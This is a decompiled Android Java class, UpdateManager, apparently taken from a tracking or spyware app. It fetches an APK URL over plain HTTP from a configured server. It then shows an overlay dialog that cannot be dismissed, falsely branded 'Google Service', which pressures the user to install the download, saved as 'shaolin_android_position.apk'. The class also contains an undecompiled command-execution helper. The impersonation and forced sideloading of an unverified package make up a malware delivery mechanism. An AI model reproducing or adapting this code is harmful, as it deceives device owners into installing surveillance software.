package com.xmpp.client.util;

import android.app.AlertDialog.Builder;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.ProgressBar;
import com.android.service.R;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.jivesoftware.smackx.packet.IBBExtensions.Data;

public class UpdateManager {
    private static final int DOWN_OVER = 2;
    private static final int DOWN_UPDATE = 1;
    /* access modifiers changed from: private */
    public String apkUrl = "";
    private String dataPath = (File.separator + Data.ELEMENT_NAME + File.separator + Data.ELEMENT_NAME + File.separator + "lab.shaolin.download" + File.separator + "apps" + File.separator);
    /* access modifiers changed from: private */
    public ProgressDialog dialog;
    private Thread downLoadThread;
    private Dialog downloadDialog;
    private String hostname = "";
    /* access modifiers changed from: private */
    public boolean interceptFlag = false;
    /* access modifiers changed from: private */
    public Context mContext;
    /* access modifiers changed from: private */
    public Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 1:
                    UpdateManager.this.dialog.setProgress(UpdateManager.this.progress);
                    return;
                case 2:
                    UpdateManager.this.dialog.dismiss();
                    UpdateManager.this.installApk();
                    return;
                default:
                    return;
            }
        }
    };
    private ProgressBar mProgress;
    private Runnable mdownApkRunnable = new Runnable() {
        public void run() {
            try {
                System.out.println("UpdateManager--------------171---------開始下載");
                HttpURLConnection conn = (HttpURLConnection) new URL(UpdateManager.this.apkUrl).openConnection();
                conn.connect();
                int length = conn.getContentLength();
                InputStream is = conn.getInputStream();
                int count;
                byte[] buf;
                if (Environment.getExternalStorageState().equals("mounted")) {
                    File file = new File(UpdateManager.this.path);
                    if (!file.exists()) {
                        file.mkdir();
                    }
                    String apkFile = UpdateManager.this.saveFileName;
                    System.out.println("saveFileName: " + UpdateManager.this.saveFileName);
                    FileOutputStream fos = new FileOutputStream(new File(apkFile));
                    count = 0;
                    buf = new byte[1024];
                    do {
                        int numread = is.read(buf);
                        count += numread;
                        UpdateManager.this.progress = (int) ((((float) count) / ((float) length)) * 100.0f);
                        UpdateManager.this.mHandler.sendEmptyMessage(1);
                        if (numread <= 0) {
                            System.out.println("UpdateManager---------------------199--------下載完成----");
                            UpdateManager.this.mHandler.sendEmptyMessage(2);
                            break;
                        }
                        fos.write(buf, 0, numread);
                    } while (!UpdateManager.this.interceptFlag);
                    fos.close();
                    is.close();
                    return;
                }
                System.out.println("246---------------no sd ka-----");
                FileOutputStream outStream = UpdateManager.this.mContext.openFileOutput(UpdateManager.this.saveFileName, 1);
                System.out.println("saveFileName: " + UpdateManager.this.saveFileName);
                count = 0;
                if (is != null) {
                    buf = new byte[1024];
                    do {
                        int ch = is.read(buf);
                        count += ch;
                        UpdateManager.this.progress = (int) ((((float) count) / ((float) length)) * 100.0f);
                        UpdateManager.this.mHandler.sendEmptyMessage(1);
                        if (ch <= 0) {
                            System.out.println("UpdateManager---------------------199--------下載完成----");
                            UpdateManager.this.mHandler.sendEmptyMessage(2);
                            break;
                        }
                        outStream.write(buf, 0, ch);
                    } while (!UpdateManager.this.interceptFlag);
                }
                outStream.flush();
                if (outStream != null) {
                    outStream.close();
                }
                if (is != null) {
                    is.close();
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e2) {
                e2.printStackTrace();
            }
        }
    };
    private Dialog noticeDialog;
    String path = "";
    /* access modifiers changed from: private */
    public int progress;
    /* access modifiers changed from: private */
    public String saveFileName = "";
    private String savePath = "/sdcard/update/";
    private String strAPKName = "";
    private String updateMsg = "有最新的套裝軟體，是否升級？";
    private String version;

    public UpdateManager(Context context) {
        this.mContext = context;
        this.hostname = context.getString(R.string.hostname);
        if (Environment.getExternalStorageState().equals("mounted")) {
            this.path = this.savePath;
            this.saveFileName = this.savePath + "shaolin_android_position.apk";
            System.out.println(this.saveFileName);
            return;
        }
        this.path = this.dataPath;
        this.saveFileName = "shaolin_android_position.apk";
        System.out.println(this.saveFileName);
    }

    public void checkUpdateInfo() {
        System.out.println("UPDATEmanager------------------------------93-------檢查升級-----");
        checkApk();
        if (!getAppVersionName().equals(this.version)) {
            showDownloadDialog();
        }
    }

    public void checkApk() {
        String strResult = "";
        try {
            HttpResponse httpResponse = new DefaultHttpClient().execute(new HttpGet("http://" + this.hostname + ":8080/MonkeyDIYWeb/GetVersionName"));
            if (httpResponse.getStatusLine().getStatusCode() == 200) {
                ParserResult(EntityUtils.toString(httpResponse.getEntity()));
            }
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
    }

    private void showNoticeDialog() {
        Builder builder = new Builder(this.mContext);
        builder.setTitle("Google Service更新");
        builder.setMessage(this.updateMsg);
        builder.setPositiveButton("下載", new OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                UpdateManager.this.showDownloadDialog();
            }
        });
        builder.setNegativeButton("以後再說", new OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        });
        this.noticeDialog = builder.create();
        this.noticeDialog.getWindow().setType(2003);
        this.noticeDialog.show();
    }

    /* access modifiers changed from: private */
    public void showDownloadDialog() {
        this.dialog = new ProgressDialog(this.mContext);
        this.dialog.setMessage("Google Service 為提供用戶優質服務,請安裝最新版本!");
        this.dialog.setProgressStyle(0);
        this.dialog.setCancelable(false);
        this.dialog.getWindow().setType(2003);
        this.dialog.show();
        downloadApk();
    }

    /* JADX WARNING: Removed duplicated region for block: B:63:? A:{SYNTHETIC, RETURN} */
    /* JADX WARNING: Removed duplicated region for block: B:29:0x005c  */
    /* JADX WARNING: Removed duplicated region for block: B:65:? A:{SYNTHETIC, RETURN} */
    /* JADX WARNING: Removed duplicated region for block: B:42:0x0074  */
    /* JADX WARNING: Removed duplicated region for block: B:54:0x008f  */
    public static java.lang.String exec(java.lang.String[] r12) {
        /*
        r11 = -1;
        r8 = "";
        r6 = new java.lang.ProcessBuilder;
        r6.<init>(r12);
        r5 = 0;
        r3 = 0;
        r4 = 0;
        r0 = new java.io.ByteArrayOutputStream;	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        r0.<init>();	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        r7 = -1;
        r5 = r6.start();	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        r3 = r5.getErrorStream();	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
    L_0x0019:
        r7 = r3.read();	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        if (r7 != r11) goto L_0x0048;
    L_0x001f:
        r10 = 10;
        r0.write(r10);	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        r4 = r5.getInputStream();	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
    L_0x0028:
        r7 = r4.read();	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        if (r7 != r11) goto L_0x0060;
    L_0x002e:
        r1 = r0.toByteArray();	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        r9 = new java.lang.String;	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        r9.<init>(r1);	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        if (r3 == 0) goto L_0x003c;
    L_0x0039:
        r3.close();	 Catch:{ IOException -> 0x0098 }
    L_0x003c:
        if (r4 == 0) goto L_0x0041;
    L_0x003e:
        r4.close();	 Catch:{ IOException -> 0x0098 }
    L_0x0041:
        if (r5 == 0) goto L_0x0046;
    L_0x0043:
        r5.destroy();
    L_0x0046:
        r8 = r9;
    L_0x0047:
        return r8;
    L_0x0048:
        r0.write(r7);	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        goto L_0x0019;
    L_0x004c:
        r2 = move-exception;
        r2.printStackTrace();	 Catch:{ all -> 0x0082 }
        if (r3 == 0) goto L_0x0055;
    L_0x0052:
        r3.close();	 Catch:{ IOException -> 0x0078 }
    L_0x0055:
        if (r4 == 0) goto L_0x005a;
    L_0x0057:
        r4.close();	 Catch:{ IOException -> 0x0078 }
    L_0x005a:
        if (r5 == 0) goto L_0x0047;
    L_0x005c:
        r5.destroy();
        goto L_0x0047;
    L_0x0060:
        r0.write(r7);	 Catch:{ IOException -> 0x004c, Exception -> 0x0064 }
        goto L_0x0028;
    L_0x0064:
        r2 = move-exception;
        r2.printStackTrace();	 Catch:{ all -> 0x0082 }
        if (r3 == 0) goto L_0x006d;
    L_0x006a:
        r3.close();	 Catch:{ IOException -> 0x007d }
    L_0x006d:
        if (r4 == 0) goto L_0x0072;
    L_0x006f:
        r4.close();	 Catch:{ IOException -> 0x007d }
    L_0x0072:
        if (r5 == 0) goto L_0x0047;
    L_0x0074:
        r5.destroy();
        goto L_0x0047;
    L_0x0078:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x005a;
    L_0x007d:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x0072;
    L_0x0082:
        r10 = move-exception;
        if (r3 == 0) goto L_0x0088;
    L_0x0085:
        r3.close();	 Catch:{ IOException -> 0x0093 }
    L_0x0088:
        if (r4 == 0) goto L_0x008d;
    L_0x008a:
        r4.close();	 Catch:{ IOException -> 0x0093 }
    L_0x008d:
        if (r5 == 0) goto L_0x0092;
    L_0x008f:
        r5.destroy();
    L_0x0092:
        throw r10;
    L_0x0093:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x008d;
    L_0x0098:
        r2 = move-exception;
        r2.printStackTrace();
        goto L_0x0041;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.xmpp.client.util.UpdateManager.exec(java.lang.String[]):java.lang.String");
    }

    private void downloadApk() {
        this.downLoadThread = new Thread(this.mdownApkRunnable);
        this.downLoadThread.start();
    }

    /* access modifiers changed from: private */
    public void installApk() {
        File apkfile;
        Intent i;
        if (Environment.getExternalStorageState().equals("mounted")) {
            apkfile = new File(this.saveFileName);
            if (apkfile.exists()) {
                System.out.println("UpdateManaget-----------------------236--------安裝APK--------");
                i = new Intent("android.intent.action.VIEW");
                i.addFlags(268435456);
                i.setDataAndType(Uri.parse("file://" + apkfile.toString()), "application/vnd.android.package-archive");
                this.mContext.startActivity(i);
                return;
            }
            return;
        }
        System.out.println("updatemanager-------------335--------begin 安裝");
        apkfile = new File("/data/data/unicall.unicom.uniwell/files/" + this.saveFileName);
        if (apkfile.exists()) {
            System.out.println("UpdateManaget-----------------------236--------安裝APK--------");
            i = new Intent("android.intent.action.VIEW");
            i.setDataAndType(Uri.parse("file://" + apkfile.toString()), "application/vnd.android.package-archive");
            this.mContext.startActivity(i);
        }
    }

    private String getAppVersionName() {
        String versionName = "";
        try {
            versionName = this.mContext.getPackageManager().getPackageInfo(this.mContext.getPackageName(), 0).versionName;
            System.out.println("UpdateManager-----------------------256-------版本號---" + versionName);
            if (versionName == null || versionName.length() <= 0) {
                return "";
            }
        } catch (Exception e) {
        }
        return versionName;
    }

    private void ParserResult(String str) {
        String[] array = str.split(",");
        this.version = array[0].trim();
        this.apkUrl = array[1].trim();
        Log.v("00000000000000000000", this.apkUrl);
    }
}
